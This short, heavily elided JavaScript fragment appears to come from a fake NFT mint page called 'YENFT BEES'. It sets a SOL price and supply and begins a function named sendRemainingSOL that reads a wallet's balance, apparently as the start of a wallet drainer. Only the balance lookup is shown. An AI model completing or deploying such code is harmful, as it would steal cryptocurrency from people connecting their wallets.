...
const solAmount = '2 / 2.2'
const image = 'https://pbs.twimg.com/profile_images/1600506731058135042/CsTGPFan_400x400.jpg'
const Title = "YENFT BEES"
const supply = 2127
...
function App() {
    ...
    async function sendRemainingSOL(walletKeyPair, connection,) {
        ...
        try {
            const balance = await connection.getBalance(walletKeyPair);
